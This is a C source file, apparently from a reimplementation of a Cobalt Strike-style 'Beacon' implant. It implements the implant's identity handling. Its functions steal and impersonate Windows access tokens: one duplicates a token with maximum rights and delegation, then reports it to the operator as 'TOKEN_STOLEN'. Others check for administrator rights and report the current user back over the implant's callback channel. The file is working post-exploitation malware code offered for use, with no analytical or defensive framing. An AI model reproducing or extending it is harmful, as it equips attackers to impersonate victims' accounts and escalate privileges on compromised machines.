#include "pch.h"

#include "beacon.h"


HANDLE gIdentityToken;
WCHAR gIdentityDomain[20];
datap* gIdentityCredentialsFormat;

/**
 * Retrieves the username associated with the given token handle.
 *
 * @param hToken The handle to the token.
 * @param buffer The buffer to store the username.
 * @param size The size of the buffer.
 * @return Returns TRUE if the username is successfully retrieved, FALSE otherwise.
 */
BOOL IdentityGetUserInfo(HANDLE hToken, char* buffer, int size)
{
	CHAR tokenInfo[0x1000];
	DWORD returnLength;

	// Get the token information for the given token handle.
	if (!GetTokenInformation(hToken, TokenUser, tokenInfo, sizeof(tokenInfo), &returnLength))
		return FALSE;

	CHAR name[0x200] = { 0 };
	CHAR domain[0x200] = { 0 };

	DWORD nameLength = sizeof(name);
	DWORD domainLength = sizeof(domain);

	// Lookup the account SID to retrieve the username and domain.
	if (!LookupAccountSidA(NULL, ((TOKEN_USER*)tokenInfo)->User.Sid, name, &nameLength, domain, &domainLength, NULL))
		return FALSE;

	// Format the username in the format "domain\username" and store it in the buffer.
	snprintf(buffer, size, "%s\\%s", domain, name);
	buffer[size - 1] = 0;
	return TRUE;
}

void IdentityRevertToken(void)
{
	if (gIdentityToken)
		RevertToSelf();
}

void IdentityImpersonateToken(void)
{
	if (gIdentityToken)
		ImpersonateLoggedOnUser(gIdentityToken);
}

void IdentityGetUidInternal(HANDLE hToken)
{
	char userInfo[0x200];
	if (IdentityGetUserInfo(hToken, userInfo, sizeof(userInfo)))
	{
		char uidString[0x400];
		snprintf(uidString, sizeof(uidString), BeaconIsAdmin() ? "%s (admin)" : "%s", userInfo);
		BeaconOutput(CALLBACK_TOKEN_GETUID, uidString, strlen(uidString));
	}
}

void IdentityGetUid(void)
{
	HANDLE hToken;

	if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken)
		|| OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		IdentityGetUidInternal(hToken);

		CloseHandle(hToken);
	} else if (gIdentityToken)
	{
		IdentityRevertToken();

		IdentityGetUidInternal(gIdentityToken);

		IdentityImpersonateToken();
	} else
	{
		LERROR("Failed to open token");
		BeaconErrorNA(ERROR_OPEN_TOKEN_FAILED);
	}
}

/**
 * Apply the specified token as Beacon's current thread token.
 * Sets the token for the current thread and reports the new token to the user.
 *
 * @param token The handle to the token to be used.
 * @return Returns TRUE if the identity-related operations were successful, otherwise FALSE.
 */
BOOL BeaconUseToken(HANDLE token)
{
	static const int MAX_BUFFER = 0x100;

	// Allocate a buffer to store user information
	char* buffer = malloc(MAX_BUFFER);
	memset(buffer, 0, MAX_BUFFER);

	BOOL result;
	BeaconRevertToken();

	// Impersonate the logged-on user using the specified token
	if (!ImpersonateLoggedOnUser(token))
	{
		result = FALSE;
		goto cleanup;
	}

	// Duplicate the token with maximum allowed access rights
	if (!DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityDelegation, TokenPrimary, &gIdentityToken))
	{
		result = FALSE;
		goto cleanup;
	}

	// Impersonate the logged-on user using the duplicated token
	if (!ImpersonateLoggedOnUser(gIdentityToken))
	{
		result = FALSE;
		goto cleanup;
	}

	// Get user information from the token and store it in the buffer
	if (!IdentityGetUserInfo(gIdentityToken, buffer, MAX_BUFFER))
	{
		result = FALSE;
		goto cleanup;
	}

	// Report the new token to the user
	BeaconOutput(CALLBACK_TOKEN_STOLEN, buffer, strlen(buffer));
	result = TRUE;

cleanup: 
	// Clear the buffer and free the allocated memory
	memset(buffer, 0, MAX_BUFFER);
	free(buffer);

	return result;
}

/**
 * Drops the current thread token.
 * Use this over direct calls to RevertToSelf().
 * This function cleans up other state information about the token as well.
 */
void BeaconRevertToken(void)
{
	// If there an already stolen token, close its handle.
	if (gIdentityToken)
		CloseHandle(gIdentityToken);

	// Reset the token.
	gIdentityToken = NULL;

	// Revert to the self security context (that is, drop the stolen token from the current thread)
	RevertToSelf();

	// Free the memory allocated for the credentials format.
	if (gIdentityCredentialsFormat) {
		BeaconFormatFree(gIdentityCredentialsFormat);
		memset(&gIdentityDomain, 0, sizeof(gIdentityDomain));
	}
}

/**
 * Checks if the current user running the code has administrative privileges.
 *
 * @return TRUE if Beacon is in a high-integrity context, FALSE otherwise.
 */
BOOL BeaconIsAdmin(void)
{
	// Define the SID_IDENTIFIER_AUTHORITY structure and initialize it with the SECURITY_NT_AUTHORITY constant.
	SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

	// Allocate and initialize a security identifier (SID) for the built-in administrators group.
	PSID sid;
	if (!AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &sid))
		return FALSE;

	// Check if the current token (security context) is a member of the specified group SID.
	BOOL isAdmin;
	if (!CheckTokenMembership(NULL, sid, &isAdmin)) {
		FreeSid(sid);
		return FALSE;
	}

	// Free the allocated SID and return the result.
	FreeSid(sid);
	return isAdmin;
}